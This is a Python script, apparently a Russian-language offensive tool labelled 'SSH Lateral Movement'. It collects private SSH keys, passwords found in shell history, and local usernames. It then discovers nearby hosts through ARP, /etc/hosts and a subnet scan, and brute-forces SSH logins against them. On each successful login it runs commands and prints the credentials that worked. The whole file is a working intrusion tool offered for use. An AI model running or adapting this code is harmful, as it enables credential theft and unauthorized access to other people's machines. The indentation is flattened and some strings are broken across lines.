#!/usr/bin/env python3
import paramiko
import threading
import queue
import os
import re
import subprocess
import argparse
import ipaddress
import socket
from pathlib import Path
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
access_map = {}
lock
 = threading.Lock()
def collect_ssh_keys() -> list[str]:
"""Собираем SSH приватные ключи с текущей машины."""
keys = []
key_paths = [
os.path.expanduser("~/.ssh/id_rsa"),
os.path.expanduser("~/.ssh/id_ed25519"),
os.path.expanduser("~/.ssh/id_ecdsa"),
os.path.expanduser("~/.ssh/id_dsa"),
"/root/.ssh/id_rsa",
"/home/*/.ssh/id_rsa",
]
# Также ищем ключи в нестандартных местах
for key_path in key_paths:
if "*" in key_path:
import glob
for f in glob.glob(key_path):
key_paths.append(f)
continue
if os.path.exists(key_path):
try:
with open(key_path) as f:
content = f.read()
if "PRIVATE KEY" in content:
keys.append(key_path)
print(f" {GREEN}[+] SSH ключ: {key_path}{RESET}")
except (PermissionError, OSError):
pass
return keys
def collect_passwords() -> list[str]:
passwords = ["", "root", "admin", "password", "123456", "toor"]
# Из .bash_history — ищем -p аргументы
history = os.path.expanduser("~/.bash_history")
if os.path.exists(history):
try:
with open(history, errors="ignore") as f:
for line in f:
m = re.search(r'-p\s*(\S+)', line)
if m:
passwords.append(m.group(1))
except Exception:
pass
return list(set(passwords))
def collect_usernames() -> list[str]:
usernames = ["root", "admin", os.getenv("USER", "ubuntu")]
# Из /etc/passwd — реальные пользователи
try:
with open("/etc/passwd") as f:
for line in f:
parts = line.split(":")
if len(parts) >= 6 and parts[5].startswith("/home"):
usernames.append(parts[0])
except Exception:
pass
return list(set(usernames))
def discover_hosts(subnet: str | None = None) -> list[str]:
"""Обнаруживаем хосты через ARP и /etc/hosts."""
hosts = []
# ARP таблица
arp_output = subprocess.run(["arp", "-n"],
capture_output=True, text=True).stdout
for line in arp_output.split("\n"):
m = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
if m and "incomplete" not in line:
hosts.append(m.group(1))
# /etc/hosts
try:
with open("/etc/hosts") as f:
for line in f:
line = line.strip()
if line and not line.startswith("#"):
parts = line.split()
if parts:
ip = parts[0]
if re.match(r'\d+\.\d+\.\d+\.\d+', ip):
if not ip.startswith("127.") and ip != "0.0.0.0":
hosts.append(ip)
except Exception:
pass
# Если указана подсеть — сканируем её
if subnet:
print(f"{CYAN}[*] Сканируем подсеть {subnet}...{RESET}")
try:
network = ipaddress.ip_network(subnet, strict=False)
sock_queue = queue.Queue()
results = queue.Queue()
def ping_host(ip_str: str) -> None:
try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(0.5)
if s.connect_ex((ip_str, 22)) == 0:
results.put(ip_str)
s.close()
except Exception:
pass
threads = []
for host_ip in network.hosts():
t = threading.Thread(target=ping_host, args=(str(host_ip),),
daemon=True)
t.start()
threads.append(t)
for t in threads:
t.join(timeout=2)
while not results.empty():
hosts.append(results.get())
except ValueError:
print(f"{RED}[!] Неверный формат подсети{RESET}")
return list(set(hosts))
def try_ssh(host: str, username: str, password: str | None,
key_path: str | None) -> tuple[bool, str]:
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
if key_path:
client.connect(host, username=username, key_filename=key_path,
timeout=5, allow_agent=False)
else:
client.connect(host, username=username, password=password,
timeout=5, allow_agent=False,
look_for_keys=False)
# Выполняем whoami для подтверждения
stdin, stdout, stderr = client.exec_command("id; hostname")
output = stdout.read().decode().strip()
client.close()
return (True, output)
except paramiko.AuthenticationException:
return (False, "AuthFailed")
except (paramiko.SSHException, socket.error, Exception):
return (False, "ConnectionFailed")
def worker(host_queue: queue.Queue, usernames: list[str],
passwords: list[str], key_paths: list[str]) -> None:
while not host_queue.empty():
try:
host = host_queue.get_nowait()
except queue.Empty:
break
for username in usernames:
for key_path in key_paths:
success, output = try_ssh(host, username, None, key_path)
if success:
with lock:
print(f"\n{GREEN}[✓] SSH KEY SUCCESS: {username}@{host}{RESET}")
print(f" Ключ: {key_path}")
print(f" ID: {output[:100]}")
access_map[host] = {
"method": "key", "user": username,
"key": key_path, "id": output
}
host_queue.task_done()
return
# Затем пробуем пароли
for password in passwords:
success, output = try_ssh(host, username, password, None)
if success:
with lock:
print(f"\n{GREEN}[✓] SSH PASS SUCCESS:
{username}@{host}{RESET}")
print(f" Пароль: {password}")
print(f" ID: {output[:100]}")
access_map[host] = {
"method": "password", "user": username,
"password": password, "id": output
}
host_queue.task_done()
return
host_queue.task_done()
def main():
parser = argparse.ArgumentParser(description="SSH Lateral Movement")
parser.add_argument("--discover", action="store_true", help="Обнаружить
хосты через ARP")
parser.add_argument("--subnet", default=None, help="Подсеть для
сканирования: 192.168.1.0/24")
parser.add_argument("--hosts", default=None, help="Список хостов через
запятую")
parser.add_argument("--threads", type=int, default=10, help="Кол-во
потоков")
args = parser.parse_args()
print(f"{CYAN}[*] SSH Lateral Movement{RESET}")
print("-" * 50)
# Собираем credentials
print(f"{CYAN}[*] Сбор SSH ключей...{RESET}")
key_paths = collect_ssh_keys()
print(f"{CYAN}[*] Сбор паролей...{RESET}")
passwords = collect_passwords()
print(f"{CYAN}[*] Сбор пользователей...{RESET}")
usernames = collect_usernames()
print(f"\n{CYAN}[*] Ключей: {len(key_paths)} | Паролей: {len(passwords)} | "
f"Пользователей: {len(usernames)}{RESET}")
if args.hosts:
hosts = [h.strip() for h in args.hosts.split(",")]
elif args.discover or args.subnet:
hosts = discover_hosts(args.subnet)
else:
hosts = discover_hosts()
my_ip = subprocess.run(["hostname", "-I"], capture_output=True,
text=True).stdout.strip().split()
hosts = [h for h in hosts if h not in my_ip and h != "127.0.0.1"]
print(f"{CYAN}[*] Целей для проверки: {len(hosts)}{RESET}\n")
if not hosts:
print(f"{RED}[-] Хосты не найдены{RESET}")
return
# Запускаем параллельный перебор
host_queue = queue.Queue()
for h in hosts:
host_queue.put(h)
threads = []
for _ in range(min(args.threads, len(hosts))):
t = threading.Thread(target=worker,
args=(host_queue, usernames, passwords, key_paths),
daemon=True)
t.start()
threads.append(t)
for t in threads:
t.join()
# Итоговая карта доступа
print(f"\n{'='*60}")
if access_map:
print(f"{GREEN}[✓] Получен доступ к {len(access_map)} хостам:{RESET}")
for host, info in access_map.items():
print(f"\n {GREEN}{info['user']}@{host}{RESET}")
print(f" Метод: {info['method']}")
print(f" ID: {info.get('id', 'N/A')[:80]}")
else:
print(f"{RED}[-] Доступ не получен ни к одному хосту{RESET}")
if __name__ == "__main__":
main()
